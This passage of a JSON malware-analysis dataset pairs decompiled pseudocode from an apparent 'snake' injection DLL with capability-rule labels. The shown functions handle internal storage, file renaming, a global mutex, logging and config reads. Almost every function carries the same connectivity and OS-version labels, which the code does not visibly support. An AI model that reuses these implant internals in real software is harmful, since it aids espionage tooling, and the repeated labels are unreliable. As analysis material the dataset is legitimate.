        "decompiled_code": "\nuint32_t __cdecl\nfcn.200035fc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint32_t arg_20h, \n            uint32_t *arg_24h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_4ch;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if ((arg_1ch == 0) || (arg_24h == NULL)) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.20002de0(&var_4h, 0);\n        if (uVar1 == 0) {\n            fcn.20002847();\n            fcn.20002744(arg_ch, arg_10h, arg_14h);\n            iVar2 = fcn.20002965();\n            if (iVar2 == -1) {\n                uVar1 = 5;\n            }\n            else {\n                (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), &var_4ch, 0x40, iVar2);\n                var_28h = (*_sym.imp.msvcrt.dll__time64)(0);\n                (**(*(var_4h + 0x44) + 0x18))(*(var_4h + 0x48), &var_4ch, 0x40, iVar2);\n                uVar1 = var_20h - arg_18h;\n                if (arg_20h <= var_20h - arg_18h) {\n                    uVar1 = arg_20h;\n                }\n                *arg_24h = uVar1;\n                iVar2 = (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), arg_1ch, uVar1, iVar2 + 0x40 + arg_18h);\n                uVar1 = -(iVar2 != 0) & 3;\n            }\n            fcn.20002815();\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 509
    },
    "200036d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.200036d9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, int32_t arg_20h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_4ch;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if ((arg_1ch == 0) && (arg_20h != 0)) {\n        return 0xffffffff;\n    }\n    uVar3 = fcn.20002de0(&var_4h, 5);\n    iVar6 = var_4h;\n    if (uVar3 == 0) {\n        fcn.20002847();\n        fcn.20002744(arg_ch, arg_10h, arg_14h);\n        iVar4 = fcn.20002965();\n        uVar3 = 5;\n        if (iVar4 != -1) {\n            piVar1 = var_4h + 0x44;\n            puVar2 = var_4h + 0x48;\n            var_4h = iVar4;\n            iVar5 = (**(*piVar1 + 0x14))(*puVar2, &var_4ch, 0x40, iVar4);\n            iVar4 = var_4h;\n            if (iVar5 == 0) {\n                uVar3 = arg_18h + arg_20h;\n                if (var_20h < uVar3) {\n                    uVar3 = 6;\n                }\n                else {\n                    var_24h = (*_sym.imp.msvcrt.dll__time64)(0);\n                    iVar4 = var_4h;\n                    if (var_1ch < uVar3) {\n                        var_1ch = uVar3;\n                    }\n                    iVar5 = (**(*(iVar6 + 0x44) + 0x18))(*(iVar6 + 0x48), arg_1ch, arg_20h, var_4h + 0x40 + arg_18h);\n                    if (iVar5 == 0) {\n                        iVar6 = (**(*(iVar6 + 0x44) + 0x18))(*(iVar6 + 0x48), &var_4ch, 0x40, iVar4);\n                        uVar3 = -(iVar6 != 0) & 3;\n                        iVar4 = var_4h;\n                    }\n                    else {\n                        uVar3 = 3;\n                        iVar4 = var_4h;\n                    }\n                }\n            }\n            else {\n                uVar3 = 3;\n            }\n        }\n        var_4h = iVar4;\n        fcn.20002815();\n    }\n    return uVar3;\n}\n",
        "token_count": 668
    },
    "200037d2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200037d2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (arg_18h == 0) {\n        return -1;\n    }\n    iVar1 = fcn.20002de0(&var_4h, 0);\n    if (iVar1 == 0) {\n        fcn.20002847();\n        fcn.20002744(arg_ch, arg_10h, arg_14h);\n        iVar1 = fcn.20002965();\n        if (iVar1 == -1) {\n            iVar1 = 5;\n        }\n        else {\n            iVar1 = (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), arg_18h, 0x40, iVar1);\n            iVar1 = (-(iVar1 != -1) & 0xfffffffd) + 3;\n        }\n        fcn.20002815();\n    }\n    return iVar1;\n}\n",
        "token_count": 262
    },
    "20003859": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20003859(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (arg_18h == 0) {\n        return -1;\n    }\n    iVar1 = fcn.20002de0(&var_4h, 0);\n    if (iVar1 == 0) {\n        fcn.20002847();\n        iVar1 = 5;\n        iVar2 = fcn.20002744(arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            for (iVar2 = *(iVar2 + 0x10); iVar2 != 0; iVar2 = *(iVar2 + 0x14)) {\n                if ((arg_14h == NULL) || (*(iVar2 + 8) == *arg_14h)) {\n                    iVar2 = (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), arg_18h, 0x40, *(iVar2 + 0xc));\n                    if (iVar2 == 0) {\n                        iVar1 = 0;\n                    }\n                    break;\n                }\n            }\n        }\n        fcn.20002815();\n    }\n    return iVar1;\n}\n",
        "token_count": 322
    },
    "200038ed": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200038ed(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t *arg_14h, int32_t *arg_18h)\n\n{\n    code *pcVar1;\n    uint32_t *puVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_ch;\n    uint var_4h;\n    \n    puVar2 = arg_14h;\n    if (arg_14h == NULL) {\n        return -1;\n    }\n    iVar4 = fcn.20002de0(&arg_14h, 0);\n    if (iVar4 != 0) {\n        return iVar4;\n    }\n    fcn.20002847();\n    piVar3 = arg_18h;\n    if (arg_18h != NULL) {\n        *arg_18h = 0;\n    }\n    *puVar2 = 0;\n    iVar4 = fcn.20002744(arg_ch, arg_10h);\n    if (iVar4 != 0) {\n        for (iVar5 = *(iVar4 + 0x10); iVar5 != 0; iVar5 = *(iVar5 + 0x14)) {\n            *puVar2 = *puVar2 + 1;\n        }\n        if ((piVar3 != NULL) && (*puVar2 != 0)) {\n            iVar5 = (*_sym.imp.msvcrt.dll_malloc)(*puVar2 << 6);\n            *piVar3 = iVar5;\n            if (iVar5 == 0) {\ncode_r0x20003988:\n                arg_14h = 0x2;\n                goto code_r0x20003a46;\n            }\n            if (((*puVar2 < 2) || (*arg_14h[0x11] < 0x25)) || (arg_14h[0x11][9] == 0)) {\n                *puVar2 = 0;\n                for (iVar4 = *(iVar4 + 0x10); iVar4 != 0; iVar4 = *(iVar4 + 0x14)) {\n                    iVar5 = (**(arg_14h[0x11] + 0x14))(arg_14h[0x12], *puVar2 * 0x40 + *piVar3, 0x40, *(iVar4 + 0xc));\n                    if (iVar5 == -1) {\n                        arg_14h = 0x3;\n                        (*_sym.imp.msvcrt.dll_free)(*piVar3);\n                        goto code_r0x20003a32;\n                    }\n                    *puVar2 = *puVar2 + 1;\n                }\n            }\n            else {\n                iVar5 = (*_sym.imp.msvcrt.dll_calloc)(*puVar2, 0xc);\n                if (iVar5 == 0) goto code_r0x20003988;\n                *puVar2 = 0;\n                for (iVar4 = *(iVar4 + 0x10); iVar4 != 0; iVar4 = *(iVar4 + 0x14)) {\n                    *(*puVar2 * 0xc + iVar5) = *puVar2 * 0x40 + *piVar3;\n                    *(*puVar2 * 0xc + 4 + iVar5) = *(iVar4 + 0xc);\n                    *(*puVar2 * 0xc + 8 + iVar5) = 0x40;\n                    *puVar2 = *puVar2 + 1;\n                }\n                iVar4 = (**(arg_14h[0x11] + 0x24))(arg_14h[0x12], iVar5, *puVar2);\n                pcVar1 = _sym.imp.msvcrt.dll_free;\n                if (iVar4 != 0) {\n                    arg_14h = 0x3;\n                    (*_sym.imp.msvcrt.dll_free)();\n                    (*pcVar1)(*piVar3);\ncode_r0x20003a32:\n                    *piVar3 = 0;\n                    *puVar2 = 0;\n                    goto code_r0x20003a46;\n                }\n                (*_sym.imp.msvcrt.dll_free)(iVar5);\n            }\n        }\n    }\n    arg_14h = NULL;\ncode_r0x20003a46:\n    fcn.20002815();\n    return arg_14h;\n}\n",
        "token_count": 963
    },
    "20003a9b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20003a9b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h, uint *arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4ch;\n    uint size;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if ((arg_18h == NULL) || (arg_1ch == NULL)) {\n        iVar2 = -1;\n    }\n    else {\n        iVar2 = fcn.20002de0(&var_4h, 1);\n        if (iVar2 == 0) {\n            fcn.20002847();\n            iVar2 = fcn.20002744(arg_ch, arg_10h);\n            if ((iVar2 == 0) || (iVar3 = fcn.20002965(arg_14h),  iVar3 == -1)) {\n                iVar2 = 5;\n            }\n            else {\n                iVar4 = (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), &var_4ch, 0x40, iVar3);\n                if (iVar4 == 0) {\n                    iVar4 = (*_sym.imp.msvcrt.dll_malloc)(size);\n                    *arg_18h = iVar4;\n                    if (iVar4 == 0) {\n                        iVar2 = 2;\n                    }\n                    else {\n                        iVar3 = (**(*(var_4h + 0x44) + 0x14))(*(var_4h + 0x48), iVar4, size, iVar3 + 0x40);\n                        if (iVar3 == 0) {\n                            *arg_1ch = size;\n                            fcn.20002c2b(iVar2, arg_14h);\n                            iVar2 = 0;\n                            if ((-1 < *(var_4h + 0x4c)) &&\n                               (((uVar1 = *(var_4h + 0x20),  1 < uVar1 &&\n                                 (*(var_4h + 0x18) <= uVar1 && uVar1 != *(var_4h + 0x18))) ||\n                                ((*(var_4h + 0x10) >> 10) / 100 < uVar1)))) {\n                                fcn.20002fbf(arg_8h);\n                            }\n                        }\n                        else {\n                            iVar2 = 3;\n                            (*_sym.imp.msvcrt.dll_free)(*arg_18h);\n                        }\n                    }\n                }\n                else {\n                    iVar2 = 3;\n                }\n            }\n            fcn.20002815();\n            return iVar2;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 625
    },
    "20003e6b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.20003e6b(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x20034158 == -1) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.20002eae(*0x20034158, 0);\n        *0x20034158 = -1;\n    }\n    fcn.20001567(0x20047340);\n    iVar2 = 0;\n    do {\n        if (*(iVar2 * 4 + 0x2004735c) != 0) break;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 10);\n    fcn.2000157d(0x20047340);\n    if (9 < iVar2) {\n        fcn.2000155c(0x20047340);\n        *0x20047358 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 214
    },
    "20003f5e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x20003fe1)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.20003f5e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, int32_t s2, int32_t *arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint s1;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_20h == NULL) {\n        return -1;\n    }\n    iVar1 = fcn.20002de0(&var_4h, 1);\n    iVar3 = var_4h;\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.20002847();\n    if (*(iVar3 + 0x28) != '\\0') {\n        uVar2 = fcn.200027e2(arg_ch, arg_10h);\n        _var_8h = sub.ntdll.dll__allmul(uVar2 + arg_18h, (uVar2 >> 0x1f) + CARRY4(uVar2, arg_18h), 100, 0);\n        uVar4 = sub.ntdll.dll__allmul(*(iVar3 + 0x10), 0, *(iVar3 + 0x28), 0);\n        if (uVar4 < _var_8h) {\n            arg_20h = 0x7;\n            goto code_r0x20004099;\n        }\n    }\n    sub.ntdll.dll_memset(&var_50h, 0, 0x40);\n    var_44h = arg_14h;\n    var_50h = arg_ch;\n    var_30h = (*_sym.imp.msvcrt.dll__time64)(0);\n    var_2ch = 0;\n    var_24h = arg_18h;\n    var_48h = arg_10h;\n    var_28h = 0;\n    if (s2 != 0) {\n        sub.ntdll.dll_memcpy(&s1, s2, 0x10);\n    }\n    fcn.20002744(arg_ch, arg_10h);\n    var_4ch = fcn.200027d7();\n    var_4ch = var_4ch + 1;\n    *arg_20h = var_4ch;\n    iVar3 = fcn.20003bfe(&var_50h);\n    if (iVar3 == -1) {\n        arg_20h = 0x4;\n    }\n    else {\n        arg_20h = fcn.200028a0(arg_ch, arg_10h, *arg_20h, arg_14h, iVar3, arg_18h);\n        fcn.20002744(arg_ch, arg_10h);\n        fcn.200027a2();\n    }\ncode_r0x20004099:\n    fcn.20002815();\n    return arg_20h;\n}\n",
        "token_count": 760
    },
    "200040a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.200040a9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_4h;\n    \n    if ((arg_18h == 0) && (arg_1ch != 0)) {\n        return -1;\n    }\n    iVar1 = fcn.20002de0(0, 5);\n    if (iVar1 == 0) {\n        iVar1 = fcn.20003f5e(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_4h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.200036d9(arg_8h, arg_ch, arg_10h, var_4h, 0, arg_18h, arg_1ch);\n            if (iVar1 != 0) {\n                fcn.200033be(arg_8h, arg_ch, arg_10h, var_4h);\n            }\n        }\n        fcn.20002815();\n    }\n    return iVar1;\n}\n",
        "token_count": 287
    },
    "20004198": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20004198(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint *s;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint *arg_10h_00;\n    uint var_114h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t ptr;\n    \n    arg_10h_00 = NULL;\n    var_8h = 0;\n    var_10h = 0;\n    if ((arg_8h == 0) || (arg_10h == NULL)) {\n        return -1;\n    }\n    if (*0x20047358 == 0) {\n        sub.ntdll.dll_memset(0x20047340, 0, 0x44);\n        fcn.20001551(0x20047340);\n        *0x20047358 = 1;\n    }\n    ptr = (*_sym.imp.msvcrt.dll_malloc)(0x104);\n    if (ptr == 0) {\n        return 2;\n    }\n    iVar3 = (*_sym.imp.msvcrt.dll__fullpath)(ptr, arg_8h, 0x104);\n    if (iVar3 == 0) {\n        (*_sym.imp.msvcrt.dll_free)(ptr);\n        return -1;\n    }\n    fcn.20001567(0x20047340);\n    *arg_10h = -1;\n    var_ch = 1;\n    iVar3 = 0;\n    do {\n        iVar4 = *(iVar3 * 4 + 0x2004735c);\n        if (iVar4 == 0) {\n            *arg_10h = iVar3;\n        }\n        else {\n            iVar4 = sub.ntdll.dll_strcmp(ptr, *(iVar4 + 0x40));\n            if (iVar4 == 0) {\n                (*_sym.imp.msvcrt.dll_free)(ptr);\n                *arg_10h = iVar3;\n                piVar1 = *(iVar3 * 4 + 0x2004735c) + 4;\n                *piVar1 = *piVar1 + 1;\n                arg_8h = 0;\n                goto code_r0x200042ee;\n            }\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 10);\n    if ((*arg_10h == -1) || (arg_10h_00 = (*_sym.imp.msvcrt.dll_malloc)(0x70),  arg_10h_00 == NULL))\n    goto code_r0x2000427b;\n    sub.ntdll.dll_memset(arg_10h_00, 0, 0x70);\n    arg_10h_00[0x10] = ptr;\n    arg_10h_00[0x11] = arg_14h;\n    iVar3 = (**(arg_14h + 4))(arg_8h, 0);\n    arg_10h_00[0x12] = iVar3;\n    if (iVar3 == 0) {\n        arg_8h = 3;\n    }\n    else {\n        arg_10h_00[1] = 1;\n        iVar3 = (**(arg_10h_00[0x11] + 0x14))(iVar3, arg_10h_00 + 2, 0x2c, 0);\n        while( true ) {\n            if ((((((iVar3 != 0) || (uVar5 = (**(arg_10h_00[0x11] + 0x10))(arg_10h_00[0x12]),  uVar5 == 0xffffffff)) ||\n                  (uVar5 < 0x2c)) ||\n                 (((arg_10h_00[2] != uVar5 && (arg_10h_00[2] = uVar5,  var_8h != 0)) &&\n                  (iVar3 = fcn.2000282f(),  iVar3 != 0)))) ||\n                ((uVar5 = arg_10h_00[3],  0x40000000 < uVar5 || (uVar2 = arg_10h_00[4],  0x40000000 < uVar2)))) ||\n               ((uVar2 < uVar5 || ((0x20000000 < arg_10h_00[5] || (uVar2 < arg_10h_00[5] + uVar5))))))\n            goto code_r0x200042e1;\n            if (var_8h != 0) break;\n            if ((arg_10h_00[0xc] == 0) || (arg_10h_00[0xc] == -0x33333334)) {\n                uVar6 = fcn.2000266e();\n                arg_10h_00[0xc] = uVar6;\n                iVar3 = fcn.2000282f();\n                if (iVar3 != 0) goto code_r0x200042e1;\n            }\n            sub.ntdll.dll_memset(&var_114h, 0, 0x104);\n            fcn.200088de(\"%s:%x\", \"Global\\\\{c2b99b50-5bf2-4c81-90d3-6c6c82ba5111}\");\n            s = arg_10h_00 + 0x18;\n            iVar3 = fcn.20001588(s, &var_114h);\n            if ((iVar3 != 0) && (iVar3 = fcn.200015f9(s, &var_114h),  iVar3 != 0)) {\n                arg_8h = -1;\n                goto code_r0x200042e8;\n            }\n            fcn.2000157d(0x20047340);\n            var_ch = 0;\n            fcn.20001628(s);\n            var_8h = 1;\n            iVar3 = (**(arg_10h_00[0x11] + 0x14))(arg_10h_00[0x12], arg_10h_00 + 2, 0x2c, 0);\n        }\n        (**(arg_10h_00[0x11] + 0x1c))(arg_10h_00[0x12], 2);\n        arg_8h = fcn.20002a83();\n        if (arg_8h != 0) goto code_r0x200042e8;\n        var_10h = 1;\n        arg_10h_00[9] = 1;\n        iVar3 = fcn.2000282f();\n        if (iVar3 == 0) {\n            if (-1 < arg_ch) {\n                fcn.20002fbf(*arg_10h_00);\n            }\n            arg_10h_00[0x13] = arg_ch;\n            if ((0 < arg_ch) && (iVar3 = fcn.200012fa(arg_10h_00 + 0x14),  iVar3 != 0)) {\n                fcn.20001cfb(arg_10h_00 + 0x16, 0x20003f1c, arg_10h_00);\n            }\n            fcn.20001567(0x20047340);\n            *arg_10h = -1;\n            iVar3 = 0;\n            goto code_r0x20004536;\n        }\ncode_r0x200042e1:\n        arg_8h = 3;\ncode_r0x200042e8:\n        if (var_ch == 0) goto code_r0x200042f9;\n    }\n    goto code_r0x200042ee;\n    while (iVar3 = iVar3 + 1,  iVar3 < 10) {\ncode_r0x20004536:\n        if (*(iVar3 * 4 + 0x2004735c) == 0) {\n            arg_8h = 0;\n            *arg_10h = iVar3;\n            *(iVar3 * 4 + 0x2004735c) = arg_10h_00;\n            goto code_r0x200042ee;\n        }\n    }\ncode_r0x2000427b:\n    arg_8h = -1;\ncode_r0x200042ee:\n    fcn.2000157d(0x20047340);\ncode_r0x200042f9:\n    if ((arg_10h_00 != NULL) && (arg_10h_00[0x12] != 0)) {\n        (**(arg_10h_00[0x11] + 0x1c))(arg_10h_00[0x12], 1);\n    }\n    if (var_8h != 0) {\n        fcn.20001637(arg_10h_00 + 0x18);\n    }\n    if (arg_8h != 0) {\n        if (var_10h != 0) {\n            fcn.200026a7();\n        }\n        if (arg_10h_00 != NULL) {\n            if (arg_10h_00[0x12] != 0) {\n                (**(arg_10h_00[0x11] + 8))(arg_10h_00[0x12]);\n            }\n            if (var_8h != 0) {\n                fcn.2000161b(arg_10h_00 + 0x18);\n            }\n            (*_sym.imp.msvcrt.dll_free)(arg_10h_00);\n        }\n        (*_sym.imp.msvcrt.dll_free)(ptr);\n    }\n    return arg_8h;\n}\n",
        "token_count": 2184
    },
    "200045cf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.200045cf(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = 0x20046c2c;\n    iVar2 = 10;\n    do {\n        if (*piVar1 != 0) {\n            sym.inj_snake_Win32.dll_t_close(piVar1, 0);\n        }\n        piVar1 = piVar1 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 120
    },
    "20004c53": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20004c53(uint s, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint unaff_EDI;\n    uint dest;\n    uint s1;\n    uint var_30h;\n    int32_t var_1ch;\n    \n    iVar3 = sub.ntdll.dll_strlen();\n    iVar4 = sub.ntdll.dll_strlen(s);\n    if (iVar3 + iVar4 < 0x105) {\n        sub.ntdll.dll_strcpy(&dest);\n        iVar3 = fcn.20004956(&dest);\n        if (iVar3 == 0) {\n            sub.ntdll.dll_strcat(&dest);\n        }\n        else {\n            sub.ntdll.dll_strcpy(iVar3, s);\n        }\n        iVar3 = sub.msvcrt.dll__stat(&dest, &var_30h);\n        if ((iVar3 != -1) && (var_1ch != 0)) {\n            iVar3 = sub.msvcrt.dll__stat();\n            pcVar1 = _sym.imp.msvcrt.dll__unlink;\n            if (iVar3 == 0) {\n                sub.ntdll.dll_strcpy(&s1);\n                iVar3 = fcn.20004956(&s1);\n                if (iVar3 == 0) {\n                    sub.ntdll.dll_strcat(&s1);\n                }\n                else {\n                    sub.ntdll.dll_strcpy(iVar3, \".tmp\");\n                }\n                iVar3 = sub.msvcrt.dll__stat(&s1, &var_30h);\n                if (((iVar3 != 0) || (iVar3 = (*pcVar1)(&s1),  iVar3 != -1)) &&\n                   (pcVar2 = _sym.imp.msvcrt.dll_rename,  iVar3 = (*_sym.imp.msvcrt.dll_rename)(),  iVar3 != -1)) {\n                    iVar3 = fcn.20004896(&dest, unaff_EDI);\n                    if (iVar3 != -1) goto code_r0x20004db1;\n                    (*pcVar1)();\n                    (*pcVar2)(&s1);\n                }\n            }\n            else {\n                iVar3 = fcn.20004896(&dest, unaff_EDI);\n                if (iVar3 != -1) {\ncode_r0x20004db1:\n                    if (arg_ch != 0) {\n                        (*pcVar1)(&dest);\n                    }\n                    return 0;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 553
    },
    "20005045": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.20005045(uint *arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint32_t arg_10h;\n    uint var_974h;\n    uint s;\n    uint var_71h;\n    uint var_60h;\n    uint var_30h;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.ntdll.dll_strncpy;\n    var_ch = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    if (*0x20046c64 != 0) {\n        return 0x21590064;\n    }\n    *0x200471c8 = 0;\n    *_sym.imp.msvcrt.dll__fmode = 0x8000;\n    (*pcVar1)(0x20047220, arg_8h, 0x104);\n    *0x20047200 = arg_ch;\n    (*pcVar1)(&s, arg_8h, 0x104);\n    var_71h._0_1_ = 0;\n    puVar2 = (*_sym.imp.ntdll.dll_strrchr)(&s, 0x23);\n    if (puVar2 == NULL) {\n        var_4h = -1;\n    }\n    else {\n        *puVar2 = 0;\n        var_4h = (*_sym.imp.ntdll.dll_strtoul)(puVar2 + 1, 0, 0);\n        arg_8h = &s;\n    }\n    fcn.20004c53(\".upd\", 1);\n    iVar3 = fcn.20004581(arg_8h, 1);\n    if (iVar3 == 0) {\n        if (var_4h == -1) {\n            iVar3 = 0;\ncode_r0x20005153:\n            if (iVar3 != 0) goto code_r0x20005179;\n        }\n        else {\n            iVar3 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 0xb, &var_4h, &var_71h + 1);\n            if (iVar3 != 0) {\n                fcn.20003e6b();\n                if (var_4h != 1) {\n                    arg_10h = iVar3 + 0x191U | 0x21590000;\n                    goto code_r0x200052d3;\n                }\n                goto code_r0x20005153;\n            }\n            fcn.20003efc(0xfffffffe, var_60h);\n        }\n        iVar3 = fcn.20007ba8(&var_30h, 0x10, 0x229);\n        if (iVar3 != 0) {\n            fcn.20003e6b();\n            goto code_r0x20005179;\n        }\n        arg_10h = 0;\ncode_r0x200051fc:\n        var_14h = 1;\n        sym.inj_snake_Win32.dll_snake_log(8, 0, arg_10h, 0, 0);\n        sym.inj_snake_Win32.dll_config_read(5, 0x200471e0, 0x20, &var_18h);\n        if (*0x200471e0 == '\\0') {\n            *0x200471e0 = '.';\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(0x800, 0x1004, 0x200471e1, 0x1f);\n            if (iVar3 == 0) {\n                *0x200471e0 = '\\0';\n            }\n        }\n        fcn.2000ae75();\n        fcn.200047be(&var_974h, 0x800);\n        arg_10h = sym.inj_snake_Win32.dll_tm_init(&var_974h);\n        if (arg_10h == 0) {\n            var_ch = 1;\n            iVar3 = fcn.20008828();\n            if (iVar3 == 0) {\n                var_8h = 1;\n            }\n            arg_10h = fcn.2000bc26();\n            if (arg_10h == 0) {\n                var_10h = 1;\n                arg_10h = fcn.20001cfb(&var_20h, 0x20004e54, arg_ch);\n                if (arg_10h == 0) {\n                    fcn.20001d2f(&var_20h);\n                    arg_10h = 0;\n                    *0x20046c64 = 1;\n                }\n            }\n        }\n        sym.inj_snake_Win32.dll_snake_log(9, 0, arg_10h, 0, 0);\n    }\n    else {\ncode_r0x20005179:\n        arg_10h = iVar3 + 0x191U | 0x21590000;\n        iVar3 = fcn.20004c53(\".sav\", 0);\n        if ((iVar3 != 0) || (iVar3 = fcn.20004581(arg_8h, 0),  iVar3 != 